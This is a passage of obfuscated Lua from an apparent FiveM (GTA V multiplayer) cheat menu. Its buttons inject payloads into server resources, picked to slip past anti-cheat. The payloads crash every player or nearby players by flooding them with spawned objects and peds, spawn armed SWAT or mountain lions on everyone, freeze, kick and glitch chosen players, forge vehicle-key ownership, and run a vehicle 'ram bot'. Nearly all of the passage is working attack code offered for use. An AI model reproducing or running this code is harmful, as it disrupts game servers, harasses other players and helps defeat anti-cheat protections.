SetEntityAsMissionEntity(v51,true,true);Citizen.InvokeNative(16877356000000000000,Citizen.PointerValueIntInitialized(v51));break;end end end v198=2;end if (v198==(0 -0)) then v53=false;if (v50 and DoesEntityExist(v50)) then local v354=1049 -(572 + 477) ;while true do if (v354==0) then SetEntityAsMissionEntity(v50,true,true);Citizen.InvokeNative(10814315000000000000 -407899934 ,Citizen.PointerValueIntInitialized(v50));break;end end end v198=87 -(84 + 2) ;end end end CreateThread(function() local v199=0 -0 ;while true do Wait(73 + 27 );if (v53 and v50 and v51 and v52 and DoesEntityExist(v52)) then local v299=842 -(497 + 345) ;local v300;local v301;local v302;local v303;local v304;local v305;local v306;local v307;local v308;local v309;local v310;local v311;local v312;while true do if (v299==0) then if  not IsPedInVehicle(v50,v51,false) then TaskWarpPedIntoVehicle(v50,v51, -1);Wait(300);end v300=GetEntityCoords(v52);v301=GetEntityForwardVector(v52);v299=1 + 0 ;end if (v299==3) then v308=nil;if v306 then v308=v307;else v308=v300-(v301 * (2 + 8)) ;end SetEntityCoords(v51,v308.x,v308.y,v308.z + 1 ,false,false,false,false);v299=1337 -(605 + 728) ;end if (v299==(5 + 2)) then while (GetGameTimer()<v312) and v53  do Wait(222 -122 );local v406=GetEntityCoords(v51);local v407= #(v406-v300);if (v407<=5) then break;end local v408=GetVehicleBodyHealth(v51);if ((v408<(v310-(3 + 47))) and (GetGameTimer()>v199)) then v311=true;v199=GetGameTimer() + (11091 -8091) ;v310=v408;break;else v310=v408;end end if v311 then if (DoesEntityExist(v51) and (IsEntityOnFire(v51) or (GetVehicleEngineHealth(v51)<100))) then local v440=0;while true do if (v440==2) then SetVehicleEngineOn(v51,true,true,false);SetPedCanBeKnockedOffVehicle(v50,1 + 0 );TaskWarpPedIntoVehicle(v50,v51, -(2 -1));Wait(378 + 122 );break;end if (v440==0) then print("Vehicle damaged or on fire. Repairing and teleporting.");SetEntityCoords(v51,v308.x,v308.y,v308.z + 1 );SetEntityHeading(v51,v309);SetVehicleFixed(v51);v440=490 -(457 + 32) ;end if (v440==1) then SetVehicleDeformationFixed(v51);SetVehicleEngineHealth(v51,425 + 575 );SetVehicleBodyHealth(v51,2402 -(832 + 570) );SetVehicleUndriveable(v51,false);v440=2 + 0 ;end end else ClearPedTasksImmediately(v50);TaskLeaveVehicle(v50,v51,0 + 0 );Wait(1769 -1269 );SetPedToRagdoll(v50,1446 + 1554 ,3000,0,false,false,false);Wait(4296 -(588 + 208) );end else local v422=0 -0 ;local v423;while true do if (v422==1) then Wait(2200 -(884 + 916) );v423=GetEntityHeading(v51);v422=2;end if (v422==(0 -0)) then ClearPedTasks(v50);v55= not v55;v422=1;end if (v422==(2 + 0)) then SetEntityHeading(v51,(v423 + (833 -(232 + 421)))%(2249 -(1569 + 320)) );Wait(123 + 377 );break;end end end break;end if (v299==(1 + 0)) then v302=v56(v52);v303=nil;function v303(v409,v410,v411) local v412=0 -0 ;local v413;while true do if (v412==(605 -(316 + 289))) then v413=26 -16 ;if (v411=="front") then return v409 + (v410 * v413) ;elseif (v411=="back") then return v409-(v410 * v413) ;end break;end end end v299=2;end if (6==v299) then v310=GetVehicleBodyHealth(v51);v311=false;v312=GetGameTimer() + 231 + 4769 ;v299=1460 -(666 + 787) ;end if (v299==(429 -(360 + 65))) then v309=GetHeadingFromVector2d(v300.x-v308.x ,v300.y-v308.y );SetEntityHeading(v51,v309);Wait(234 + 16 );v299=259 -(79 + 175) ;end if (v299==(2 -0)) then v304=(v55 and "front") or "back" ;v305=v303(v300,v301,v304);v306,v307=GetSafeCoordForPed(v305.x,v305.y,v305.z,false,0 + 0 );v299=8 -5 ;end if (v299==(9 -4)) then SetVehicleEngineOn(v51,true,true,false);SetVehicleForwardSpeed(v51,939 -(503 + 396) );TaskVehicleDriveToCoordLongrange(v50,v51,v300.x,v300.y,v300.z,281 -(92 + 89) ,GetEntityModel(v51),10 -4 );v299=6;end end end end end);MachoMenuButton(v39[1 + 0 ],"Start Ram Bot",function() if  not v53 then StartAttack();else print("NPC is already attacking.");end end);MachoMenuButton(v39[1 + 0 ],"Stop Ram Bot",function() if v53 then StopAttack();else print("No attack in progress.");end end);MachoMenuButton(v39[3 -2 ],"Crash Everyone",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
        local function CrashPlayer(ped)
            local playerPos = GetEntityCoords(ped, false)
            local modelHashes = {
                0x34315488,
                0x6A27FEB1, 0xCB2ACC8,
                0xC6899CDE, 0xD14B5BA3,
                0xD9F4474C, 0x32A9996C,
                0x69D4F974, 0xCAFC1EC3,
                0x79B41171, 0x1075651,
                0xC07792D4, 0x781E451D,
                0x762657C6, 0xC2E75A21,
                0xC3C00861, 0x81FB3FF0,
                0x45EF7804, 0xE65EC0E4,
                0xE764D794, 0xFBF7D21F,
                0xE1AEB708, 0xA5E3D471,
                0xD971BBAE, 0xCF7A9A9D,
                0xC2CC99D8, 0x8FB233A4,
                0x24E08E1F, 0x337B2B54,
                0xB9402F87, 0x4F2526DA
            }

            for i = 1, #modelHashes do
                obj = CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
            end
        end

        for i = 0, 128 do
            if i ~= PlayerId() then
                local targetPed = GetPlayerPed(i)
                if DoesEntityExist(targetPed) then
                    CrashPlayer(targetPed)
                end
            end
        end
    ]]);end);MachoMenuButton(v39[1 + 0 ],"Attach To Player",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
        Citizen.CreateThread(function()
        local isAttached = false
        local attachedToPlayer = nil

        while true do
            Citizen.Wait(0) -- Prevent the script from hanging the game

            if IsControlJustReleased(0, 38) then -- 'E' key
                if not isAttached then
                    local playerPed = PlayerPedId()
                    local closestPlayer, closestDistance = GetClosestPlayer()
                    
                    if closestPlayer ~= -1 and closestDistance < 3.0 then
                        local targetPed = GetPlayerPed(closestPlayer)
                        -- Get the bone index for the right hand
                        local boneIndex = GetPedBoneIndex(targetPed, 57005)
                        -- Attach to the player's hand with horizontal rotation
                        AttachEntityToEntity(playerPed, targetPed, boneIndex, 0.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, false, false, false, 2, true)
                        isAttached = true
                        attachedToPlayer = closestPlayer
                        print("Attached to player's hand")
                    else
                        print("No player nearby to attach to")
                    end
                else
                    DetachEntity(PlayerPedId(), true, false)
                    isAttached = false
                    attachedToPlayer = nil
                    print("Detached from player")
                end
            end
        end
    end)

    function GetClosestPlayer()
        local players = GetActivePlayers()
        local closestDistance = -1
        local closestPlayer = -1
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed, 0)

        for i = 1, #players do
            local targetPed = GetPlayerPed(players[i])
            if targetPed ~= playerPed then
                local targetCoords = GetEntityCoords(targetPed, 0)
                local distance = Vdist(playerCoords.x, playerCoords.y, playerCoords.z, targetCoords.x, targetCoords.y, targetCoords.z)
                if closestDistance == -1 or closestDistance > distance then
                    closestPlayer = players[i]
                    closestDistance = distance
                end
            end
        end
        
        return closestPlayer, closestDistance
    end
    ]]);end);MachoMenuButton(v39[2 -1 ],"SWAT Railgun On Everyone",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
local swat = "s_m_y_swat_01"
local bR = "weapon_railgun"
for i = 0, 128 do
local coo = GetEntityCoords(GetPlayerPed(i))
RequestModel(GetHashKey(swat))
Citizen.Wait(50)
if HasModelLoaded(GetHashKey(swat)) then
local ped =
CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
NetworkRegisterEntityAsNetworked(ped)
if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
local ei = PedToNet(ped)
NetworkSetNetworkIdDynamic(ei, false)
SetNetworkIdCanMigrate(ei, true)
SetNetworkIdExistsOnAllMachines(ei, true)
GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
SetPedCanSwitchWeapon(ped, true)
NetToPed(ei)
TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
elseif IsEntityDead(GetPlayerPed(i)) then
TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
else
Citizen.Wait(0)
end
end
end
]]);end);MachoMenuButton(v39[1 + 0 ],"Spawn Mountain Lion On Everyone",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
local mtlion = "A_C_MtLion"
for i = 0, 128 do
local co = GetEntityCoords(GetPlayerPed(i))
RequestModel(GetHashKey(mtlion))
Citizen.Wait(50)
if HasModelLoaded(GetHashKey(mtlion)) then
local ped =
CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
NetworkRegisterEntityAsNetworked(ped)
if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
local ei = PedToNet(ped)
NetworkSetNetworkIdDynamic(ei, false)
SetNetworkIdCanMigrate(ei, true)
SetNetworkIdExistsOnAllMachines(ei, true)
Citizen.Wait(50)
NetToPed(ei)
TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
elseif IsEntityDead(GetPlayerPed(i)) then
TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
else
Citizen.Wait(0)
end
end
end
]]);end);MachoMenuButton(v39[1 + 0 ],"Kosatka Crash By ID",function() MachoInjectResource((v47("es_extended") and "es_extended") or (v47("qb-core") and "qb-core") or "any" ,[[
            local Config = {
        targetPlayerId = nil, -- We'll set this after listing players
        fragmentModel = "kosatka",
        waitTime = 2000,
        spawnAmount = 3000,
        debugMode = true -- Set to false in production
    }

    -- Logging system
    local Log = {
        info = function(msg) print("^3[INFO]^7 " .. msg) end,
        success = function(msg) print("^2[SUCCESS]^7 " .. msg) end,
        error = function(msg) print("^1[ERROR]^7 " .. msg) end,
        warn = function(msg) print("^8[WARNING]^7 " .. msg) end,
        debug = function(msg)
            if Config.debugMode then
                print("^5[DEBUG]^7 " .. msg)
            end
        end
    }

    -- Utility functions
    local Util = {
        requestModel = function(modelHash)
            RequestModel(modelHash)
            local startTime = GetGameTimer()
            while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
                if GetGameTimer() - startTime > 5000 then -- 5 second timeout
                    Log.error("Model load timed out")
                    return false
                end
            end
            return true
        end,

        getPlayerPed = function(serverId)
            return GetPlayerPed(GetPlayerFromServerId(serverId))
        end,

        getEntityCoords = function(entity)
            return DoesEntityExist(entity) and GetEntityCoords(entity) or nil
        end,

        listPlayers = function()
            local players = GetActivePlayers()
            print("^6Available players:^7")
            for _, playerId in ipairs(players) do
                local playerName = GetPlayerName(playerId)
                local serverID = GetPlayerServerId(playerId)
                print(string.format("^5ID: %d^7 | ^3Name: %s^7", serverID, playerName))
            end
        end,

        inputNumber = function(prompt)
            AddTextEntry('FMMC_KEY_TIP1', prompt)
            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", "", "", "", "", 10)
            while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
                Citizen.Wait(0)
            end
            if UpdateOnscreenKeyboard() ~= 2 then
                local result = GetOnscreenKeyboardResult()
                Citizen.Wait(500)
                return tonumber(result)
            else
                Citizen.Wait(500)
                return nil
            end
        end,

        createObjectForTargetPlayer = function(modelHash, coords, targetPlayerId)
            local obj = CreateObject(modelHash, coords.x, coords.y, coords.z, true, false, true)
            if DoesEntityExist(obj) then
                local netId = NetworkGetNetworkIdFromEntity(obj)
                SetNetworkIdExistsOnAllMachines(netId, true)
                NetworkSetNetworkIdDynamic(netId, false)
                SetNetworkIdCanMigrate(netId, false)
                
                -- Make the object invisible to all players except the target
                Citizen.CreateThread(function()
                    while DoesEntityExist(obj) do
                        SetEntityLocallyInvisible(obj)
                        Citizen.Wait(0)
                    end
                end)
                
                -- Make it visible only for the target player
                local targetPlayerHandle = GetPlayerFromServerId(targetPlayerId)
                if targetPlayerHandle ~= -1 then
                    SetNetworkIdSyncToPlayer(netId, targetPlayerHandle, true)
                end
                
                return obj
            end
            return nil
        end
    }

    -- Main functions
    local function spawnFragmentObject(modelHash, coords, targetPlayerId)
        local obj = Util.createObjectForTargetPlayer(modelHash, coords, targetPlayerId)
        if DoesEntityExist(obj) then
            BreakObjectFragmentChild(obj, 1, true)
            Log.success("Object spawned, fragmented, and networked for target player.")
            return obj
        else
            Log.error("Failed to spawn object.")
            return nil
        end
    end

    local function cleanUp(objects)
        for _, obj in ipairs(objects) do
            if DoesEntityExist(obj) then
                DeleteEntity(obj)
            end
        end
        Log.success(string.format("Deleted %d objects.", #objects))
    end

    -- Main thread
    Citizen.CreateThread(function()
        Util.listPlayers()
        Config.targetPlayerId = Util.inputNumber("Enter target player ID:")
        
        if not Config.targetPlayerId then
            Log.error("Invalid target player ID.")
            return
        end

        local modelHash = GetHashKey(Config.fragmentModel)
        local targetPed = Util.getPlayerPed(Config.targetPlayerId)
        local targetCoords = Util.getEntityCoords(targetPed)

        if not targetCoords then
            Log.error("Target player not found.")
            return
        end

        local success, errorMsg = pcall(function()
            if not Util.requestModel(modelHash) then
                error("Failed to load model")
            end

            local spawnedObjects = {}
            local spawnStart = GetGameTimer()
            local spawnTimeout = 10000 -- 10 seconds timeout for spawning all objects

            for i = 1, Config.spawnAmount do
                if GetGameTimer() - spawnStart > spawnTimeout then
                    Log.error("Spawn process timed out")
                    break
                end

                local obj = spawnFragmentObject(modelHash, targetCoords, Config.targetPlayerId)
                if obj then
                    table.insert(spawnedObjects, obj)
                    Log.debug(string.format("Spawned and networked object %d/%d for target player", #spawnedObjects, Config.spawnAmount))
                else
                    Log.error(string.format("Failed to spawn object %d", i))
                end

                if i < Config.spawnAmount then
                    Citizen.Wait(10)
                end
            end

            local spawnTime = GetGameTimer() - spawnStart
            Log.info(string.format("Spawned %d/%d objects in %d ms", #spawnedObjects, Config.spawnAmount, spawnTime))

            if #spawnedObjects > 0 then
                Log.info(string.format("Waiting for %d ms before cleanup", Config.waitTime))
                Citizen.Wait(Config.waitTime)

                local cleanupStart = GetGameTimer()
                cleanUp(spawnedObjects)
                local cleanupTime = GetGameTimer() - cleanupStart
                Log.info(string.format("Cleanup completed in %d ms", cleanupTime))
            else
                Log.warn("No objects were spawned, skipping cleanup")
            end

            SetModelAsNoLongerNeeded(modelHash)
        end)

        if not success then
            Log.error("An error occurred during script execution: " .. tostring(errorMsg))
        else
            Log.success("Script executed successfully")
        end
    end)
        ]]);end);MachoMenuButton(v39[2 -1 ],"Kick From Vehicle",function() local v200=0 + 0 ;local v201;while true do if (v200==(0 -0)) then v201=MachoMenuGetSelectedPlayer();if (v201 and (v201>0)) then MachoInjectResource((v47("ReaperV4") and "ReaperV4") or (v47("oxmysql") and "oxmysql") or (v47("monitor") and "monitor") or "any" ,([[
                    local function GhJkUiOpLzXcVbNm()
                        local kJfHuGtFrDeSwQa = %d
                        local oXyBkVsNzQuH = _G.GetPlayerPed
                        local yZaSdFgHjKlQ = _G.GetVehiclePedIsIn
                        local wQeRtYuIoPlMn = _G.PlayerPedId
                        local cVbNmQwErTyUiOp = _G.SetVehicleExclusiveDriver_2
                        local ghjawrusdgddsaf = _G.SetPedIntoVehicle

                        local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                        local veh = yZaSdFgHjKlQ(targetPed, 0)

                        local function nMzXcVbNmQwErTy(func, ...)
                            local _print = print
                            local function errorHandler(ex)
                                -- _print("SCRIPT ERROR: " .. ex)
                            end

                            local argsStr = ""
                            for _, v in ipairs({...}) do
                                if type(v) == "string" then
                                    argsStr = argsStr .. "\"" .. v .. "\", "
                                elseif type(v) == "number" or type(v) == "boolean" then
                                    argsStr = argsStr .. tostring(v) .. ", "
                                else
                                    argsStr = argsStr .. tostring(v) .. ", "
                                end
                            end
                            argsStr = argsStr:sub(1, -3)

                            local script = string.format("return func(%%s)", argsStr)
                            local fn, err = load(script, "@pipboy.lua", "t", { func = func })
                            if not fn then
                                -- _print("Error loading script: " .. err)
                                return nil
                            end

                            local success, result = xpcall(function() return fn() end, errorHandler)
                            if not success then
                                -- _print("Error executing script: " .. result)
                                return nil
                            else
                                return result
                            end
                        end

                        if veh ~= 0 then
                            Wait(100)
                            nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, wQeRtYuIoPlMn(), 1)
                            ghjawrusdgddsaf(wQeRtYuIoPlMn(), veh, -1)
                            
                            Wait(100)
                            nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, 0, 0)
                        end
                    end

                    GhJkUiOpLzXcVbNm()
                ]]):format(v201));end break;end end end);MachoMenuButton(v39[1245 -(485 + 759) ],"Freeze Player",function() local v202=0;local v203;while true do if (v202==(0 -0)) then v203=MachoMenuGetSelectedPlayer();if (v203 and (v203>(1189 -(442 + 747)))) then MachoInjectResource((v47("ReaperV4") and "ReaperV4") or (v47("oxmysql") and "oxmysql") or (v47("monitor") and "monitor") or "any" ,([[
                    local function VtQzAfXyYu()
                        local RqTfBnLpZo = %d
                        local FgTrLpYwVs = GetPlayerPed
                        local EoKdCjXqMg = GetEntityCoords
                        local ZbLpVnXwQr = GetClosestVehicle
                        local WqErTyUiOp = PlayerPedId
                        local AsDfGhJkLz = SetPedIntoVehicle
                        local PoLiKjUhYg = ClearPedTasks
                        local QwErTyUiOp = NetworkRequestControlOfEntity
                        local CxZvBnMaSd = GetGameTimer
                        local VcMnBgTrEl = Wait
                        local TeAxSpDoMj = AttachEntityToEntityPhysically
                        local wfjaw4dtdu = CreateThread
                        local tgtPed = FgTrLpYwVs(RqTfBnLpZo)
                        local tgtCoords = EoKdCjXqMg(tgtPed)
                        local veh = cHvBzNtEkQ(tgtCoords, 150.0, 0, 70)

                        if not veh or veh == 0 then
                            print("No vehicle nearby | Aborting.")
                            return
                        end

                        QwErTyUiOp(veh)
                        Wait(100)
                        AsDfGhJkLz(WqErTyUiOp(), veh, -1)
                        VcMnBgTrEl(200)
                        PoLiKjUhYg(WqErTyUiOp())

                        wfjaw4dtdu(function()
                            local start = CxZvBnMaSd()
                            while CxZvBnMaSd() - start < 3000 do
                                TeAxSpDoMj(
                                    veh,
                                    tgtPed,
                                    0.0, 0.0, 10.0,
                                    10.0, 0.0, 0.0,
                                    true, 0, 0,
                                    false, false, 0
                                )
                                VcMnBgTrEl(0)
                            end
                        end)
                    end

                    VtQzAfXyYu()
                ]]):format(v203));end break;end end end);MachoMenuButton(v39[1],"Glitch Player",function() local v204=1135 -(832 + 303) ;local v205;while true do if (v204==(946 -(88 + 858))) then v205=MachoMenuGetSelectedPlayer();if (v205 and (v205>(0 + 0))) then MachoInjectResource((v47("ReaperV4") and "ReaperV4") or (v47("oxmysql") and "oxmysql") or (v47("monitor") and "monitor") or "any" ,([[
                    local function TnXmLoPrVq()
                        local kPdZoWxNq = %d

                        local LsKjHgFdSa = GetPlayerPed
                        local ZxCvBnMaQw = GetEntityCoords
                        local QtRvBnPoLs = GetClosestVehicle
                        local VcBgTrElMn = PlayerPedId
                        local KdJfGhTyPl = SetPedIntoVehicle
                        local TrLkUyIoPl = ClearPedTasks
                        local MwZlQxNsTp = NetworkRequestControlOfEntity
                        local AsYtGhUiMn = GetGameTimer
                        local WqErTyUiOp = Wait
                        local TeAxSpDoMj = AttachEntityToEntityPhysically
                        local CrXeTqLpVi = CreateThread

                        local xGyPtMdLoB = LsKjHgFdSa(kPdZoWxNq)
                        local zUiRpXlAsV = ZxCvBnMaQw(xGyPtMdLoB)
                        local jCaBnErYqK = QtRvBnPoLs(zUiRpXlAsV, 150.0, 0, 70)

                        if not jCaBnErYqK or jCaBnErYqK == 0 then
                            print("No vehicle nearby | Aborting.")
                            return
                        end

                        MwZlQxNsTp(veh)
                        Wait(100)
                        KdJfGhTyPl(VcBgTrElMn(), jCaBnErYqK, -1)
                        WqErTyUiOp(200)
                        TrLkUyIoPl(VcBgTrElMn())

                        CrXeTqLpVi(function()
                            local tGhXpLsMkA = AsYtGhUiMn()
                            local bErXnPoVlC = 3000

                            while AsYtGhUiMn() - tGhXpLsMkA < bErXnPoVlC do
                                TeAxSpDoMj(
                                    jCaBnErYqK,
                                    xGyPtMdLoB,
                                    0, 0, 0,
                                    2000.0, 1460.928, 1000.0,
                                    10.0, 88.0, 600.0,
                                    true, true, true, false, 0
                                )
                                WqErTyUiOp(0)
                            end
                        end)
                    end

                    TnXmLoPrVq()
                ]]):format(v205));end break;end end end);MachoMenuButton(v39[1],"Limbo Player",function() local v206=MachoMenuGetSelectedPlayer();if (v206 and (v206>(0 + 0))) then MachoInjectResource((v47("ReaperV4") and "ReaperV4") or (v47("oxmysql") and "oxmysql") or (v47("monitor") and "monitor") or "any" ,([[
                    local function VyTxQzWsCr()
                        local lDxNzVrMpY = %d

                        local FgTrLpYwVs = GetPlayerPed
                        local EoKdCjXqMg = GetEntityCoords
                        local ZbLpVnXwQr = GetClosestVehicle
                        local WqErTyUiOp = PlayerPedId
                        local AsDfGhJkLz = SetPedIntoVehicle
                        local PoLiKjUhYg = ClearPedTasks
                        local QwErTyUiOp = NetworkRequestControlOfEntity
                        local CxZvBnMaSd = GetGameTimer
                        local VcMnBgTrEl = Wait
                        local TeAxSpDoMj = AttachEntityToEntityPhysically
                        local CrXeTqLpVi = CreateThread

                        local vUpYrTnMwE = FgTrLpYwVs(lDxNzVrMpY)
                        local xAoPqMnBgR = EoKdCjXqMg(vUpYrTnMwE)
                        local cHvBzNtEkQ = ZbLpVnXwQr(xAoPqMnBgR, 150.0, 0, 70)

                        if not cHvBzNtEkQ or cHvBzNtEkQ == 0 then
                            print("No vehicle nearby | Aborting.")
                            return
                        end

                        QwErTyUiOp(veh)
                        Wait(100)
                        AsDfGhJkLz(WqErTyUiOp(), cHvBzNtEkQ, -1)
                        VcMnBgTrEl(200)
                        PoLiKjUhYg(WqErTyUiOp())

                        CrXeTqLpVi(function()
                            local kYqPmTnVzL = CxZvBnMaSd()
                            local yTbQrXlMwA = 3000
                            local hFrMxWnZuE, dEjKzTsYnL = 180.0, 8888.0

                            while CxZvBnMaSd() - kYqPmTnVzL < yTbQrXlMwA do
                                TeAxSpDoMj(
                                    cHvBzNtEkQ,
                                    vUpYrTnMwE,
                                    0, 0, 0,
                                    hFrMxWnZuE, dEjKzTsYnL, 1000.0,
                                    true, true, true, true, 0
                                )
                                VcMnBgTrEl(0)
                            end
                        end)
                    end

                    VyTxQzWsCr()
                ]]):format(v206));end end);MachoMenuButton(v39[1 + 0 ],"Copy Appearance",function() local v207=MachoMenuGetSelectedPlayer();if (v207 and (v207>(789 -(766 + 23)))) then MachoInjectResource((v47("oxmysql") and "oxmysql") or "any" ,([[
                    local function AsDfGhJkLqWe()
                        local ZxCvBnMqWeRt = %d
                        local UiOpAsDfGhJk = GetPlayerPed
                        local QwErTyUiOpAs = PlayerPedId
                        local DfGhJkLqWeRt = DoesEntityExist
                        local ErTyUiOpAsDf = ClonePedToTarget

                        local TyUiOpAsDfGh = UiOpAsDfGhJk(ZxCvBnMqWeRt)
                        if DfGhJkLqWeRt(TyUiOpAsDfGh) then
                            local YpAsDfGhJkLq = QwErTyUiOpAs()
                            ErTyUiOpAsDf(TyUiOpAsDfGh, YpAsDfGhJkLq)
                        end
                    end

                    AsDfGhJkLqWe()
                ]]):format(v207));end end);MachoMenuButton(v39[4 -3 ],"Steal Keys",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local ped = GetPlayerPed(-1)
        local veh = GetVehiclePedIsIn((ped), true)  
        local plate = GetVehicleNumberPlateText(veh)
        TriggerEvent('vehiclekeys:client:SetOwner',plate)
            ]]);end);MachoMenuButton(v39[2 -0 ],"Crash Nearby [Don't Spam]",function() MachoInjectResource((v47("ReaperV4") and "ReaperV4") or (v47("FiniAC") and "FiniAC") or (v47("WaveShield") and "WaveShield") or (v47("monitor") and "monitor") or "any" ,[[
                local function sfehwq34rw7td()
                    local Nwq7sd2Lkq0pHkfa = CreateThread
                    Nwq7sd2Lkq0pHkfa(function()
                        local hAx9qTeMnb = CreateThread
                        local Jf9uZxcTwa = _G.CreatePed           -- Creates a pedestrian (NPC)
                        local VmzKo3sRt7 = _G.PlayerPedId         -- Gets the player's ped ID
                        local LuZx8nqTys = _G.GetEntityCoords     -- Gets entity coordinates
                        local QksL02vPdt = _G.GetEntityHeading    -- Gets entity heading
                        local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset -- Sets entity coordinates
                        local PfQsXoEr6b = _G.GiveWeaponToPed    -- Gives a weapon to a ped
                        local WvNay7Zplm = _G.TaskParachute       -- Makes a ped use a parachute
                        local DjRq08bKxu = _G.FreezeEntityPosition -- Freezes entity position
                        local EkLnZmcTya = _G.GetHashKey         -- Gets a model hash key
                        local YdWxVoEna3 = _G.RequestModel       -- Requests a model to load
                        local GcvRtPszYp = _G.HasModelLoaded     -- Checks if a model is loaded
                        local MnVc8sQaLp = _G.SetEntityAsMissionEntity -- Marks entity as mission-related
                        local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded -- Frees model from memory
                        local VdNzWqbEyf = _G.DoesEntityExist    -- Checks if an entity exists
                        local AxWtRuLskz = _G.DeleteEntity       -- Deletes an entity
                        local OplKvms9te = _G.Wait               -- Pauses execution for a specified time
                        local BnQvKdsLxa = _G.GetGroundZFor_3dCoord -- Gets ground Z-coordinate
                        local VmxrLa9Ewt = _G.ApplyForceToEntity -- Applies force to an entity
                        local fwafWAefAg = _G.SetEntityVisible   -- Sets entity visibility
                        local awrt325etd = _G.SetBlockingOfNonTemporaryEvents -- Blocks non-temporary events
                        local awfaw4eraq = _G.SetEntityAlpha     -- Sets entity transparency

                        hAx9qTeMnb(function()
                            -- Get the player's ped and its coordinates/heading
                            local QxoZnmWlae = VmzKo3sRt7() -- Player's ped
                            local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae) -- Player's coordinates
                            local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae) -- Player's heading
                            local ZtXmqLpEas = EzPwqLtYas.z + 1600.0 -- Set Z-coordinate 1600 units above

                            -- Teleport player to high altitude
                            Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)

                            -- Apply downward force to simulate falling
                            VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                            -- Wait 250ms to allow the fall to start
                            OplKvms9te(250)

                            -- Freeze player in place
                            DjRq08bKxu(QxoZnmWlae, true)

                            -- Equip player with a parachute
                            PfQsXoEr6b(QxoZnmWlae, "gadget_parachute", 1, false, true)
                            WvNay7Zplm(QxoZnmWlae, false) -- Trigger parachute task

                            -- Freeze player again to prevent movement
                            DjRq08bKxu(QxoZnmWlae, true)

                            -- Load the "player_one" (Franklin) model
                            local UixZpvLoa9 = EkLnZmcTya("player_one")
                            YdWxVoEna3(UixZpvLoa9)
                            -- Wait until the model is loaded
                            while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end

                            -- Create a table to store created peds
                            local TzsPlcxQam = {}
                            -- Spawn 130 invisible peds at the player's location
                            for K9wo = 1, 130 do
                                local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
                                if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
                                    MnVc8sQaLp(IuxErv7Pqa, true, true) -- Mark ped as mission entity
                                    awrt325etd(IuxErv7Pqa, true) -- Block non-temporary events
                                    awfaw4eraq(IuxErv7Pqa, 0, true) -- Make ped invisible
                                    table.insert(TzsPlcxQam, IuxErv7Pqa) -- Store ped in table
                                end
                                OplKvms9te(1) -- Small delay to prevent freezing
                            end

                            -- Release the model from memory
                            KrXpTuwq9c(UixZpvLoa9)

                            -- Wait 300ms before cleaning up
                            OplKvms9te(300)

                            -- Delete all created peds (repeated calls may be for reliability)
                            for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
                                if VdNzWqbEyf(bTzyPq7Xsl) then
                                    AxWtRuLskz(bTzyPq7Xsl) -- Repeated deletion attempts
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                end
                            end

                            -- Unfreeze the player
                            DjRq08bKxu(QxoZnmWlae, false)

                            -- Find the ground Z-coordinate at the player's location
                            local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, 0, false)
                            if not ZkxyPqtLs0 then
                                Zfound = EzPwqLtYas.z -- Fallback to current Z if ground not found
                            end

                            -- Wait 1 second before teleporting
                            OplKvms9te(1000)

                            -- Teleport player to just above ground level
                            Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
                            DjRq08bKxu(QxoZnmWlae, true) -- Freeze player briefly
                            DjRq08bKxu(QxoZnmWlae, false) -- Unfreeze player
                        end)
                    end)
                end

                -- Execute the main function
                sfehwq34rw7td()
